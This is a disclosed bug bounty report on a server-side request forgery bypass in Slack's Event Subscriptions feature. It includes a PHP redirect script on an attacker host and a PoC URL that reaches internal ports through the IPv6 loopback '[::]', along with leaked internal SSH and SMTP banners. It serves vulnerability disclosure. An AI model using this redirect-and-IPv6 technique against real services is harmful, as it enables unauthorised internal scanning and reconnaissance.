# Bypass of the SSRF protection in Event Subscriptions parameter.

## Report Details
- **Report ID**: 386292
- **URL**: https://hackerone.com/reports/386292
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-07-24T15:39:16.016Z
- **Disclosed**: 2019-02-22T20:58:48.514Z

## Reporter
- **Username**: elber
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
The vulnerability is present in the "Event Subscriptions" parameter where:
"`Your app can subscribe to be notified of events in Slack (for example, when a user adds a reaction or creates a file) at a URL you choose.` ".
URL:
`https://api.slack.com/apps/YOUAPPCODE/event-subscriptions?`

When we add a site that does not meet API standards, we receive the following message:
{F323999}

`Your request URL gave us a 500 error. Update your URL to receive a new request and challenge value.`

After testing several SSRF techniques I found a bypass for this protection.
Using an IPV6 vector `[::]`.

On my host,  `x.php` has:

```
<?php
header("location: ".$_GET['u']);
?>
```
PoC:

http://hacker.site/x.php/?u=http://[::]:22/

Response:
SSH [::]:22

{F324002}

```
"body": {
 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
Protocol mismatch.
 
}
```

SMNTP [::]:25

{F324001}

```
"body": {
 220 squid-iad-ypfw.tinyspeck.com ESMTP Postfix
221 2.7.0 Error: I can break rules, too. Goodbye.
 
}
```

Non-existent port:
{F324000}

## Impact

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.

Referer: https://www.owasp.org/index.php/Server_Side_Request_Forgery
https://hackerone.com/reports/61312

## Attachments
- host_error.png
- lcoalhost_error.png
- local_smntp.png
- local_ssh.png
